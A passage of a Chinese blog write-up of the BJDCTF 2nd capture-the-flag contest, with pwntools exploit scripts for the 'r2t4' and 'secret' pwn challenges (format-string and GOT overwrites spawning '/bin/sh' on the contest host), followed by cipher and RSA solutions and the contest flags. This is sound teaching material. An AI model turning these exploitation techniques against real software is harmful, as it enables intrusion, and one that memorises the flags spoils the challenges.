remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">27717</span>)</span><br><span class="line"><span class="comment">#c = process('./r2t4')</span></span><br><span class="line">elf = ELF(<span class="string">'./r2t4'</span>)</span><br><span class="line">__stack_chk_fail=elf.got[<span class="string">'__stack_chk_fail'</span>]</span><br><span class="line">success(<span class="string">'__stack_chk_fail.got = '</span> + hex(__stack_chk_fail))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x400626</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'%64c%9$hn%1510c%10$hnaaa'</span></span><br><span class="line">payload += p64(__stack_chk_fail+<span class="number">2</span>)</span><br><span class="line">payload += p64(__stack_chk_fail)</span><br><span class="line"></span><br><span class="line">success(<span class="string">'payload.length = '</span> + hex(len(payload)))</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x3ff000</span>)</span></span></span><br></pre></td></tr></table></figure><p>挺蛋疼的一道题目</p><p>让你猜秘密,实际上就是猜数字，虽然这些数字在IDA中都能通过正则表达式匹配出来。。。但是一共1万个！！</p><p>有的老哥真匹配出来然后send了一万次….被BUU封IP了….</p><p>官方WP里的做法就比较巧妙</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200324023154.png" alt>name实际大小为0x10，但却read了0x16个字节</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200324023212.png" alt></p><p>而name与times_ptr紧邻，多出的6个字节可以用来覆盖times_ptr</p><p><strong>注意这里是times_ptr,这是个指针，指向真实的times</strong></p><p>程序初始times = 10000，每猜对一次，<code>times -= 1</code>。</p><p>程序给出了system函数，而且当猜错以后会调用<code>printf(name);</code></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200324014712.png" alt></p><p><strong>起初想着能不能利用这个格式化字符串漏洞,但是仔细想了想,似乎不太可行。</strong></p><p><strong>但是我们可以通过修改printf_got为system，令name以/bin/sh;开头，触发system(‘/bin/sh’)</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; got</span><br><span class="line"></span><br><span class="line">GOT protection: Partial RELRO | GOT <span class="built_in">functions</span>: 11</span><br><span class="line"> </span><br><span class="line">[0x46d018] puts@GLIBC_2.2.5 -&gt; 0x7ffff7e64cc0 (puts) ◂— push   r14</span><br><span class="line">[0x46d020] write@GLIBC_2.2.5 -&gt; 0x7ffff7eee010 (write) ◂— lea    rax, [rip + 0xdd3b9]</span><br><span class="line">[0x46d028] strlen@GLIBC_2.2.5 -&gt; 0x7ffff7f67090 ◂— mov    ecx, edi</span><br><span class="line">[0x46d030] __stack_chk_fail@GLIBC_2.4 -&gt; 0x401066 (__stack_chk_fail@plt+6) ◂— push   3</span><br><span class="line">[0x46d038] system@GLIBC_2.2.5 -&gt; 0x401076 (system@plt+6) ◂— push   4</span><br><span class="line">[0x46d040] <span class="built_in">printf</span>@GLIBC_2.2.5 -&gt; 0x401086 (<span class="built_in">printf</span>@plt+6) ◂— push   5</span><br><span class="line">[0x46d048] <span class="built_in">read</span>@GLIBC_2.2.5 -&gt; 0x7ffff7eedf70 (<span class="built_in">read</span>) ◂— lea    rax, [rip + 0xdd459]</span><br><span class="line">[0x46d050] setvbuf@GLIBC_2.2.5 -&gt; 0x7ffff7e653d0 (setvbuf) ◂— push   r13</span><br><span class="line">[0x46d058] atoi@GLIBC_2.2.5 -&gt; 0x4010b6 (atoi@plt+6) ◂— push   8</span><br><span class="line">[0x46d060] sprintf@GLIBC_2.2.5 -&gt; 0x4010c6 (sprintf@plt+6) ◂— push   9 /* <span class="string">'h\t'</span> */</span><br><span class="line">[0x46d068] <span class="built_in">exit</span>@GLIBC_2.2.5 -&gt; 0x4010d6 (<span class="built_in">exit</span>@plt+6) ◂— push   0xa /* <span class="string">'h\n'</span> */</span><br></pre></td></tr></table></figure><p>可以看到<code>printf@plt + 6 = 0x401086</code> , <code>system@plt + 6 = 0x401076</code>只相差0x10。</p><p>加之每猜对一次，times -= 1，我们可以通过溢出覆盖<code>times_ptr</code>为<code>0x46d040</code>，然后答对一定的次数，让printf_got变为system_plt，然后故意答错，触发<code>printf(name)</code>即触发<code>system(&#39;/bin/sh&#39;)</code></p><p><strong>这里有一点需要注意</strong>：官方WP给的是答对0x10次，让printf_got变成0x401076也就是<code>system@plt + 6</code>，但是亲测打不通，调试以后发现其他一切正常，但是调用system的时候报段错误…这里我试了一下，答对0x14或者0x15次，也就是让printf_got变成<code>system@plt+2</code>或者<code>system@plt+1</code>才可。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/ASDGASDFFEWAVXZC.jpg" alt></p><p>附上EXP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">'amd64'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line"><span class="comment">#c = process('./secret')</span></span><br><span class="line">c = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29217</span>)</span><br><span class="line">elf = ELF(<span class="string">'./secret'</span>)</span><br><span class="line">L = [<span class="number">0x476B</span>,<span class="number">0x2D38</span>,<span class="number">0x4540</span>,<span class="number">0x3E77</span>,<span class="number">0x3162</span>,<span class="number">0x3f7d</span>,<span class="number">0x357a</span>,<span class="number">0x3cf5</span>,</span><br><span class="line">     <span class="number">0x2f9e</span>,<span class="number">0x41ea</span>,<span class="number">0x48d8</span>,<span class="number">0x2763</span>,<span class="number">0x474c</span>,<span class="number">0x3809</span>,<span class="number">0x2e63</span>,<span class="number">0x2f4a</span>,</span><br><span class="line">     <span class="number">0x3298</span>,<span class="number">0x28f3</span>,<span class="number">0x3d1b</span>,<span class="number">0x449e</span>,<span class="number">0x3328</span>]</span><br><span class="line">success(hex(elf.got[<span class="string">'printf'</span>]))</span><br><span class="line">c.recvuntil(<span class="string">'What\'s your name?'</span>)</span><br><span class="line">c.sendline(<span class="string">'/bin/sh;AAAAAAAA'</span>+p32(elf.got[<span class="string">'printf'</span>]))<span class="comment">#use p32()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> L:</span><br><span class="line">    c.recvuntil(<span class="string">'Secret:'</span>)</span><br><span class="line">    c.sendline(str(i))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(c, 'b * 0x40133a')</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Secret:'</span>)</span><br><span class="line">c.sendline(<span class="string">'66666'</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><hr><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="签到-y1ng"><a href="#签到-y1ng" class="headerlink" title="签到-y1ng"></a>签到-y1ng</h2><p>base64,decode一下就好了。</p><h2 id="老文盲了"><a href="#老文盲了" class="headerlink" title="老文盲了"></a>老文盲了</h2><p>脑洞够大。</p><p><code>罼雧締眔擴灝淛匶襫黼瀬鎶軄鶛驕鳓哵眔鞹鰝</code></p><p>这句话的谐音就是<code>BJD大括号这就是福莱格(flag)直接交了吧大括号</code></p><p>所以flag为<code>BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵}</code></p><h2 id="燕言燕语-y1ng"><a href="#燕言燕语-y1ng" class="headerlink" title="燕言燕语-y1ng"></a>燕言燕语-y1ng</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">小燕子，穿花衣，年年春天来这里，我问燕子你为啥来，燕子说:</span><br><span class="line">79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20</span><br></pre></td></tr></table></figure><p>给了一串HEX，转ASCII以后是<code>yanzi ZJQ{xilzv_iqssuhoc_suzjg}</code></p><p>猜测是<code>维吉尼亚密码</code>，密钥是<code>yanzi</code>，成功解密</p><p>flag为<code>BJD{yanzi_jiushige_shabi}</code></p><h2 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat_flag"></a>cat_flag</h2><p>小猫很可爱。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200322234152.png" alt></p><p>从上往下，每一行代表一个二进制数，吃饭团的表示0，吃鸡腿的表示1</p><p>bin转ascii得到flag。</p><p><code>BJD{M!a0~}</code></p><h2 id="灵能精通-y1ng"><a href="#灵能精通-y1ng" class="headerlink" title="灵能精通-y1ng"></a>灵能精通-y1ng</h2><p>这题有点水，赛后看WP才知道这个密码是圣堂武士密码，通过查题目的题干能知道这是星际争霸里面的一个角色的一个技能台词？？！！</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200323224751.png" alt></p><h2 id="Y1nglish-y1ng"><a href="#Y1nglish-y1ng" class="headerlink" title="Y1nglish-y1ng"></a>Y1nglish-y1ng</h2><p>给了一个txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Nkbaslk ds sef aslckdqdqst. Sef aslckdqdqst qo lzqtbw usf ufkoplkt zth oscpslsfko. Dpkfk zfk uqjk dwcko su dscqao qt dpqo aslckdqdqst, kzap su npqap qo jkfw mzoqa. Qu wse zfk qtdkfkodkh qt tkdnsfw okaefqdw, nkbaslk ds czfdqaqczdk. Bkd lk dkbb wse z odsfw.</span><br><span class="line">Q nzo pzjqtv hqttkf zd z fkodzefztd npkt Pzffw Odkkbk azlk qt, pk qo z Izcztkok ufsl Izczt med tsn pk qo tsd bqjqtv qt Izczt, lzwmk Pzffw qot&apos;d z Izcztkok tzlk med pk qo fkzbbw z Izcztkok. Pzffw nsfwkh qt z bznwkf&apos;o suuqak wkzfo zvs, med pk qo tsn nsfwqtv zd z mztw. Pk vkdo z vssh ozbzfw, med pk zbnzwo msffsno lstkw ufsl pqo ufqktho zth tkjkf czwo qd mzaw. Pzffw ozn lk zth azlk zthozdzd dpk ozlk dzmbk. Pk pzo tkjkf msffsnkh lstkw ufsl lk. Npqbk pk nzo kzdqtv, Q zowkh pql ds bkth lk &amp;2. Ds lw oefcfqok, pk vzjk lk dpk lstkw qllkhqzdkbw. &apos;Q pzjk tkjkf msfffsnkh ztw lstkw ufsl wse,&apos; Pzffw ozqh,&apos;os tsn wse azt czw usf lw hqttkf!&apos; Tsn q nqbb vqjk wse npzd wse nztd.</span><br><span class="line">MIH&#123;cwdp0t_Mfed3_u0fa3_sF_geqcgeqc_ZQ_Af4aw&#125;</span><br></pre></td></tr></table></figure><p>下面有类似于flag的东西，但开头不是<code>BJD</code>而是<code>MIH</code>，盲猜维吉尼亚密码。</p><p><a href="https://quipqiup.com/" target="_blank" rel="noopener">quipqiup</a>在线解密,指定<code>MIH=BJD</code>,可以得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Welcome to our competition. Our competition is mainly for freshmen and sophomores. There are five types of topics in this competition, each of which is very basic. If you are interested in networy security, welcome to participate. Let me tell you a story. I was having dinner at a restaurant when Harry Steele came in, he is a Japanese from Japan but now he is not living in Japan, maybe Harry isn&apos;t a Japanese name but he is really a Japanese. Harry woryed in a lawyer&apos;s office years ago, but he is now worying at a bany. He gets a good salary, but he always borrows money from his friends and never pays it bacy. Harry saw me and came andsatat the same table. He has never borrowed money from me. While he was eating, I asyed him to lend me &amp;2. To my surprise, he gave me the money immediately. &apos;I have never borrrowed any money from you,&apos; Harry said,&apos;so now you can pay for my dinner!&apos; Now i will give you what you want. BJD&#123;pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4cy&#125;</span><br></pre></td></tr></table></figure><p>但是提交一直不成功，修改<code>Cr4cy</code>为<code>Cr4zy</code>也不成功，去群里看了看公告，发现有地方需要改。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200323005432.png" alt></p><p>读了读上面那段话，发现那段话里面该是k的地方全变成了y，所以修改<code>Cr4cy</code>为<code>Cr4ck</code>。</p><p><code>BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4ck}</code></p><h2 id="rsa0"><a href="#rsa0" class="headerlink" title="rsa0"></a>rsa0</h2><p>nc连接以后有如下回显，<strong>好像因为靶机不同，具体的回显也不同</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">e=<span class="number">15549851</span></span><br><span class="line"></span><br><span class="line">p+q=<span class="number">20863578032664632805803247009000344892321432818463015557495155759957380706376484569788486497652311136327651058215395343509008398250545579129166602948550344</span></span><br><span class="line"></span><br><span class="line">p-q=<span class="number">-3836010044914889517982485973339196492824587499988100701447424038126206797371420912301320412708697078766834687669285168738335604543547774164235502781085390</span></span><br><span class="line"></span><br><span class="line">c=<span class="number">4782030868853667565973405123820473791306349016814206730867994644057366366041543210479132972104172048240423839135782546226203699218766360325105809914202058277363302078844368666294196255268662132894564282205856907640709197985497727498750715398166130536191311534456423579523525954133760668637482507379670206959</span></span><br><span class="line"></span><br><span class="line">flag=??????</span><br></pre></td></tr></table></figure><p>….直接解出来p和q 然后…直接做就行…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p =gmpy2.mpz(<span class="number">8513783993874871643910380517830574199748422659237457428023865860915586954502531828743583042471807028780408185273055087385336396853498902482465550083732477</span>)</span><br><span class="line">q =gmpy2.mpz(<span class="number">12349794038789761161892866491169770692573010159225558129471289899041793751873952741044903455180504107547242872942340256123672001397046676646701052864817867</span>)</span><br><span class="line">e =gmpy2.mpz(<span class="number">15549851</span>)</span><br><span class="line"></span><br><span class="line">phi_n= (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">n=p*q</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, phi_n)</span><br><span class="line"></span><br><span class="line">c=gmpy2.mpz(<span class="number">4782030868853667565973405123820473791306349016814206730867994644057366366041543210479132972104172048240423839135782546226203699218766360325105809914202058277363302078844368666294196255268662132894564282205856907640709197985497727498750715398166130536191311534456423579523525954133760668637482507379670206959</span>)</span><br><span class="line"></span><br><span class="line">m=pow(c,d,n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'m = '</span> + str(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(m)[<span class="number">2</span>:].replace(<span class="string">'L'</span>,<span class="string">''</span>).decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure><h2 id="rsa1"><a href="#rsa1" class="headerlink" title="rsa1"></a>rsa1</h2><p><strong>同样是靶机不同，回显不同</strong></p><p>和rsa0一样，不过这个要根据完全平方公式推出来p和q、尝试过得出来pq（也就是n）以后直接分解n，但是分解难度太大，所以还是根据完全平方公式推p和q吧。</p><p>有一处是需要对<code>(p+q)^2</code>进行开放，普通的<code>math.sqrt()</code>方法因为这个数太大了而会报错，这里需要用<code>gmpy2.iroot(gg,2),gg代表(p+q)^2</code>，很幸运，正好开平方，<strong>也就是得到的结果进行平方以后正好等于(p+q)^2</strong></p><p>得到pqec以后脚本和rsa0就一样了。</p><hr></div><div><div><div style="text-align:center;color:#ccc;font-size:14px">-------------至此本文结束<i class="fa fa-tree"></i>感谢您的阅读-------------</div></div></div><div><div id="reward-container"><div>如果觉得这篇文章对您有用，请随意打赏。 (๑•⌄•๑) 您的支持将鼓励我继续创作！</div><button id="reward-button" disable="enable" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">打赏</button><div id="qr" style="display:none"><div style="display:inline-block"><img src="/images/Wechat_SKM.png" alt="LiuLian 微信支付"><p>微信支付</p></div><div style="display:inline-block"><img src="/images/ZFB_SKM.png" alt="LiuLian 支付宝"><p>支付宝</p></div></div></div></div><div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者： </strong>LiuLian</li><li class="post-copyright-link"><strong>本文链接：</strong> <a href="http://liul14n.top/2020/03/21/BJDCTF-2nd/" title="[BJDCTF 2nd]">http://liul14n.top/2020/03/21/BJDCTF-2nd/</a></li><li class="post-copyright-license"><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div><footer class="post-footer"><div class="post-nav"><div class="post-nav-next post-nav-item"><a href="/2020/03/20/Python-生成斐波那契数列的几种方式的对比与分析/" rel="next" title="[Python]生成斐波那契数列的几种方式的对比与分析"><i class="fa fa-chevron-left"></i> [Python]生成斐波那契数列的几种方式的对比与分析</a></div><span class="post-nav-divider"></span><div class="post-nav-prev post-nav-item"><a href="/2020/03/29/一道有-我-意-好-思-菜-的stack题目/" rel="prev" title="一道有(我)意(好)思(菜)的stack题目">一道有(我)意(好)思(菜)的stack题目 <i class="fa fa-chevron-right"></i></a></div></div></footer></div></article></div></div></div><div class="sidebar-toggle"><div class="sidebar-toggle-line-wrap"><span class="sidebar-toggle-line sidebar-toggle-line-first"></span> <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span> <span class="sidebar-toggle-line sidebar-toggle-line-last"></span></div></div><aside id="sidebar" class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">文章目录</li><li class="sidebar-nav-overview" data-target="site-overview-wrap">站点概览</li></ul><div class="site-overview-wrap sidebar-panel"><div class="site-overview"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" src="/images/touxiang.jpeg" alt="LiuLian"><p class="site-author-name" itemprop="name">LiuLian</p><div class="site-description motion-element" itemprop="description">Salute The Time</div></div><nav class="site-state motion-element"><div class="site-state-item site-state-posts"><a href="/archives/"><span class="site-state-item-count">57</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"><a href="/categories/"><span class="site-state-item-count">8</span> <span class="site-state-item-name">分类</span></a></div></nav><div class="links-of-author motion-element"><span class="links-of-author-item"><a href="https://github.com/LiuL14n" title="GitHub &rarr; https://github.com/LiuL14n" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a> </span><span class="links-of-author-item"><a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=aFlZWl1aWVxcWVEoGRlGCwcF" title="E-Mail &rarr; http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=aFlZWl1aWVxcWVEoGRlGCwcF" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a> </span><span class="links-of-author-item"><a href="http://wpa.qq.com/msgrd?v=3&uin=1125214419&site=qq&menu=yes" title="QQ &rarr; http://wpa.qq.com/msgrd?v=3&uin=1125214419&site=qq&menu=yes" rel="noopener" target="_blank"><i class="fa fa-fw fa-qq"></i>QQ</a></span></div><div class="links-of-blogroll motion-element links-of-blogroll-block"><div class="links-of-blogroll-title"><i class="fa fa-fw fa-link"></i> From 大佬 import&nbsp; <i class="fa fa-fw fa-link"></i></div><ul class="links-of-blogroll-list"><li class="links-of-blogroll-item"><a href="https://suxinghe39.github.io/" title="SuXingHe" target="_blank">SuXingHe</a></li><li class="links-of-blogroll-item"><a href="https://hal900000.github.io" title="Hal90000" target="_blank">Hal90000</a></li><li class="links-of-blogroll-item"><a href="http://n4tsu.top/" title="Natsu" target="_blank">Natsu</a></li><li class="links-of-blogroll-item"><a href="https://dililidala.github.io" title="Ohrxw" target="_blank">Ohrxw</a></li><li class="links-of-blogroll-item"><a href="http://www.wendev.site" title="JiangWen" target="_blank">JiangWen</a></li><li class="links-of-blogroll-item"><a href="https://l0ne1y.xyz/" title="L0ne1y" target="_blank">L0ne1y</a></li></ul><div id="days"></div><script>function show_date_time(){window.setTimeout("show_date_time()",1e3),BirthDay=new Date("04/25/2019 21:13:14"),today=new Date,timeold=today.getTime()-BirthDay.getTime(),sectimeold=timeold/1e3,secondsold=Math.floor(sectimeold),msPerDay=864e5,e_daysold=timeold/msPerDay,daysold=Math.floor(e_daysold),e_hrsold=24*(e_daysold-daysold),hrsold=setzero(Math.floor(e_hrsold)),e_minsold=60*(e_hrsold-hrsold),minsold=setzero(Math.floor(60*(e_hrsold-hrsold))),seconds=setzero(Math.floor(60*(e_minsold-minsold))),document.getElementById("days").innerHTML="已运行 "+daysold+" 天 "+hrsold+" 小时 "+minsold+" 分 "+seconds+" 秒"}function setzero(e){return e<10&&(e="0"+e),e}show_date_time()</script></div></div></div><div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active"><div class="post-toc"><div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Misc"><span class="nav-number">2.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Secret"><span class="nav-number">2.1.</span> <span class="nav-text">Secret</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#A-Beautiful-Picture"><span class="nav-number">2.2.</span> <span class="nav-text">A_Beautiful_Picture</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Easybaba"><span class="nav-number">2.3.</span> <span class="nav-text">Easybaba</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#小姐姐-y1ng"><span class="nav-number">2.4.</span> <span class="nav-text">小姐姐-y1ng</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Real-EasyBaBa"><span class="nav-number">2.5.</span> <span class="nav-text">Real_EasyBaBa</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#圣火昭昭"><span class="nav-number">2.6.</span> <span class="nav-text">圣火昭昭</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TARGZ-y1ng"><span class="nav-number">2.7.</span> <span class="nav-text">TARGZ-y1ng</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Imagin开场曲"><span class="nav-number">2.8.</span> <span class="nav-text">Imagin开场曲</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reverse"><span class="nav-number">3.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#guessgame"><span class="nav-number">3.1.</span> <span class="nav-text">guessgame</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8086"><span class="nav-number">3.2.</span> <span class="nav-text">8086</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwn"><span class="nav-number">4.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#写在前面"><span class="nav-number">4.1.</span> <span class="nav-text">写在前面</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#r2t3"><span class="nav-number">4.2.</span> <span class="nav-text">r2t3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#one-gadget"><span class="nav-number">4.3.</span> <span class="nav-text">one_gadget</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ydsneedgirlfriend2"><span class="nav-number">4.4.</span> <span class="nav-text">ydsneedgirlfriend2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#完整EXP"><span class="nav-number">4.4.1.</span> <span class="nav-text">完整EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#r2t4"><span class="nav-number">4.5.</span> <span class="nav-text">r2t4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#secret"><span class="nav-number">4.6.</span> <span class="nav-text">secret</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Crypto"><span class="nav-number">5.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#签到-y1ng"><span class="nav-number">5.1.</span> <span class="nav-text">签到-y1ng</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#老文盲了"><span class="nav-number">5.2.</span> <span class="nav-text">老文盲了</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#燕言燕语-y1ng"><span class="nav-number">5.3.</span> <span class="nav-text">燕言燕语-y1ng</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cat-flag"><span class="nav-number">5.4.</span> <span class="nav-text">cat_flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#灵能精通-y1ng"><span class="nav-number">5.5.</span> <span class="nav-text">灵能精通-y1ng</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Y1nglish-y1ng"><span class="nav-number">5.6.</span> <span class="nav-text">Y1nglish-y1ng</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rsa0"><span class="nav-number">5.7.</span> <span class="nav-text">rsa0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rsa1"><span class="nav-number">5.8.</span> <span class="nav-text">rsa1</span></a></li></ol></li></ol></div></div></div><div class="back-to-top"><i class="fa fa-arrow-up"></i> <span id="scrollpercent"><span>0</span>%</span></div></div></aside></div></main><footer id="footer" class="footer"><div class="footer-inner"><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="copyright">&copy; 2019 – <span itemprop="copyrightYear">2022</span> <span class="with-love" id="animate"><i class="fa fa-star"></i> </span><span class="author" itemprop="copyrightHolder">LiuLian</span></div><div class="powered-by"><i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv"> 本站访客数:<span id="busuanzi_value_site_pv"></span></span></div><div class="busuanzi-count"><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span class="post-meta-item-icon"><i class="fa fa-user"></i> </span><span class="site-uv" title="总访客量"><span class="busuanzi-value" id="busuanzi_value_site_uv"></span> </span><span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-s"></i> </span><span class="site-pv" title="总访问量"><span class="busuanzi-value" id="busuanzi_value_site_pv"></span></span></div></div></footer></div><script>"[object Function]"!==Object.prototype.toString.call(window.Promise)&&(window.Promise=null)</script><script color="255,105,180" opacity="0.6" zindex="-1" count="77" src="/lib/canvas-nest/canvas-nest.min.js"></script><script src="/lib/jquery/index.js?v=2.1.3"></script><script src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script><script src="/lib/velocity/velocity.min.js?v=1.2.1"></script><script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script><script src="/js/utils.js?v=7.1.0"></script><script src="/js/motion.js?v=7.1.0"></script><script src="/js/affix.js?v=7.1.0"></script><script src="/js/schemes/pisces.js?v=7.1.0"></script><script src="/js/scrollspy.js?v=7.1.0"></script><script src="/js/post-details.js?v=7.1.0"></script><script src="/js/next-boot.js?v=7.1.0"></script><script>!function(){var t=document.createElement("script"),e=window.location.protocol.split(":")[0];t.src="https"===e?"https://zz.bdstatic.com/linksubmit/push.js":"http://push.zhanzhang.baidu.com/push.js";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(t,s)}()</script><script>$(".highlight").each(function(e,t){var n=$("<div>").addClass("highlight-wrap");$(t).after(n),n.append($("<button>").addClass("copy-btn").append("复制").on("click",function(e){var 